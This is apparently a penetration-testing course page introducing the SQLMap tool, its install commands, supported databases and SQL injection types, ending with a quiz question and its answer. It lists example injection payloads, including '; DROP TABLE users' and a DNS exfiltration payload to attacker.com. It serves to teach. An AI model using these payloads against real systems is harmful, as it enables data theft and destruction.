
<h1>SQLMap Overview</h1>
<hr/>
<p><a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a> is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.</p>
<pre><code class="language-shell-session">[!bash!]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
&lt;...SNIP...&gt;
</code></pre>
<p>SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Target connection</td>
<td>Injection detection</td>
<td>Fingerprinting</td>
</tr>
<tr>
<td>Enumeration</td>
<td>Optimization</td>
<td>Protection detection and bypass using "tamper" scripts</td>
</tr>
<tr>
<td>Database content retrieval</td>
<td>File system access</td>
<td>Execution of the operating system (OS) commands</td>
</tr>
</tbody>
</table>
<hr/>
<h2>SQLMap Installation</h2>
<p>SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt install sqlmap
</code></pre>
<p>If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:</p>
<pre><code class="language-shell-session">[!bash!]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
</code></pre>
<p>After that, SQLMap can be run with:</p>
<pre><code class="language-shell-session">[!bash!]$ python sqlmap.py
</code></pre>
<hr/>
<h2>Supported Databases</h2>
<p>SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>MySQL</code></td>
<td><code>Oracle</code></td>
<td><code>PostgreSQL</code></td>
<td><code>Microsoft SQL Server</code></td>
</tr>
<tr>
<td><code>SQLite</code></td>
<td><code>IBM DB2</code></td>
<td><code>Microsoft Access</code></td>
<td><code>Firebird</code></td>
</tr>
<tr>
<td><code>Sybase</code></td>
<td><code>SAP MaxDB</code></td>
<td><code>Informix</code></td>
<td><code>MariaDB</code></td>
</tr>
<tr>
<td><code>HSQLDB</code></td>
<td><code>CockroachDB</code></td>
<td><code>TiDB</code></td>
<td><code>MemSQL</code></td>
</tr>
<tr>
<td><code>H2</code></td>
<td><code>MonetDB</code></td>
<td><code>Apache Derby</code></td>
<td><code>Amazon Redshift</code></td>
</tr>
<tr>
<td><code>Vertica</code>, <code>Mckoi</code></td>
<td><code>Presto</code></td>
<td><code>Altibase</code></td>
<td><code>MimerSQL</code></td>
</tr>
<tr>
<td><code>CrateDB</code></td>
<td><code>Greenplum</code></td>
<td><code>Drizzle</code></td>
<td><code>Apache Ignite</code></td>
</tr>
<tr>
<td><code>Cubrid</code></td>
<td><code>InterSystems Cache</code></td>
<td><code>IRIS</code></td>
<td><code>eXtremeDB</code></td>
</tr>
<tr>
<td><code>FrontBase</code></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>The SQLMap team also works to add and support new DBMSes periodically.</p>
<hr/>
<h2>Supported SQL Injection Types</h2>
<p>SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types.  We see the types of SQL injections supported by SQLMap with the <code>sqlmap -hh</code> command:</p>
<pre><code class="language-shell-session">[!bash!]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
</code></pre>
<p>The technique characters <code>BEUSTQ</code> refers to the following:</p>
<ul>
<li>
<code>B</code>: Boolean-based blind</li>
<li>
<code>E</code>: Error-based</li>
<li>
<code>U</code>: Union query-based</li>
<li>
<code>S</code>: Stacked queries</li>
<li>
<code>T</code>: Time-based blind</li>
<li>
<code>Q</code>: Inline queries</li>
</ul>
<hr/>
<h2>Boolean-based blind SQL Injection</h2>
<p>Example of <code>Boolean-based blind SQL Injection</code>:</p>
<pre><code class="language-SQL">AND 1=1
</code></pre>
<p>SQLMap exploits <code>Boolean-based blind SQL Injection</code> vulnerabilities through the differentiation of <code>TRUE</code> from <code>FALSE</code> query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned <code>TRUE</code> or <code>FALSE</code>. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.</p>
<ul>
<li>
<p><code>TRUE</code> results are generally based on responses having none or marginal difference to the regular server response.</p>
</li>
<li>
<p><code>FALSE</code> results are based on responses having substantial differences from the regular server response.</p>
</li>
<li>
<p><code>Boolean-based blind SQL Injection</code> is considered as the most common SQLi type in web applications.</p>
</li>
</ul>
<hr/>
<h2>Error-based SQL Injection</h2>
<p>Example of <code>Error-based SQL Injection</code>:</p>
<pre><code class="language-SQL">AND GTID_SUBSET(@@version,0)
</code></pre>
<p>If the <code>database management system</code> (<code>DBMS</code>) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers <code>Error-based SQL Injection</code> for the following DBMSes:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL</td>
<td>PostgreSQL</td>
<td>Oracle</td>
</tr>
<tr>
<td>Microsoft SQL Server</td>
<td>Sybase</td>
<td>Vertica</td>
</tr>
<tr>
<td>IBM DB2</td>
<td>Firebird</td>
<td>MonetDB</td>
</tr>
</tbody>
</table>
<p>Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.</p>
<hr/>
<h2>UNION query-based</h2>
<p>Example of <code>UNION query-based SQL Injection</code>:</p>
<pre><code class="language-SQL">UNION ALL SELECT 1,@@version,3
</code></pre>
<p>With the usage of <code>UNION</code>, it is generally possible to extend the original (<code>vulnerable</code>) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.</p>
<hr/>
<h2>Stacked queries</h2>
<p>Example of <code>Stacked Queries</code>:</p>
<pre><code class="language-SQL">; DROP TABLE users
</code></pre>
<p>Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one.  In case that there is a requirement for running non-query statements (e.g. <code>INSERT</code>, <code>UPDATE</code> or <code>DELETE</code>), stacking must be supported by the vulnerable platform (e.g., <code>Microsoft SQL Server</code> and <code>PostgreSQL</code> support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.</p>
<hr/>
<h2>Time-based blind SQL Injection</h2>
<p>Example of <code>Time-based blind SQL Injection</code>:</p>
<pre><code class="language-SQL">AND 1=IF(2&gt;1,SLEEP(5),0)
</code></pre>
<p>The principle of <code>Time-based blind SQL Injection</code> is similar to the <code>Boolean-based blind SQL Injection</code>, but here the response time is used as the source for the differentiation between <code>TRUE</code> or <code>FALSE</code>.</p>
<ul>
<li>
<p><code>TRUE</code> response is generally characterized by the noticeable difference in the response time compared to the regular server response</p>
</li>
<li>
<p><code>FALSE</code> response should result in a response time indistinguishable from regular response times</p>
</li>
</ul>
<p><code>Time-based blind SQL Injection</code> is considerably slower than the boolean-based blind SQLi, since queries resulting in <code>TRUE</code> would delay the server response. This SQLi type is used in cases where <code>Boolean-based blind SQL Injection</code> is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. <code>INSERT</code>, <code>UPDATE</code> or <code>DELETE</code>), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as <code>Boolean-based blind SQL Injection</code> would not really work in this case.</p>
<hr/>
<h2>Inline queries</h2>
<p>Example of <code>Inline Queries</code>:</p>
<pre><code class="language-SQL">SELECT (SELECT @@version) from
</code></pre>
<p>This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.</p>
<hr/>
<h2>Out-of-band SQL Injection</h2>
<p>Example of <code>Out-of-band SQL Injection</code>:</p>
<pre><code class="language-SQL">LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
</code></pre>
<p>This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.</p>
<p>By running the SQLMap on the DNS server for the domain under control (e.g. <code>.attacker.com</code>), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. <code>foo.attacker.com</code>), where <code>foo</code> would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the <code>foo</code> part, to form the entire SQL response.</p>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="304"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> What's the fastest SQLi type?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control text-success" disabled="true" type="text" value="UNION query-based"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="304" disabled="true" id="btnAnswer304">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
